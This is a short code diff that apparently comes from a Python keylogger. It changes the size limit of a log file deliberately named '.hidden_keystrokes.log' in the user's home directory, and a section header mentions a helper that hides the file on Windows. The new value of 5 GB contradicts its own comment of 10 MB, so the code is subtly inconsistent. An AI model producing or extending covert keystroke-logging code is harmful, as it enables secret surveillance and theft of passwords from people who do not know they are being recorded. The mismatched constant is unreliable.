@@ -9,7 +9,7 @@ import signal
 HOME = os.path.expanduser('~')
 LOG_FILENAME = '.hidden_keystrokes.log'  # dotfile works as hidden on Unix-like systems
 LOG_PATH = os.path.join(HOME, LOG_FILENAME)
-MAX_LOG_SIZE_BYTES = None  # optional rotation threshold (10 MB)
+MAX_LOG_SIZE_BYTES = 5 * 1024 * 1024 * 1024  # optional rotation threshold (10 MB)
 ROTATED_SUFFIX = '.old'
 
 # --- Windows: helper to set hidden attribute ---
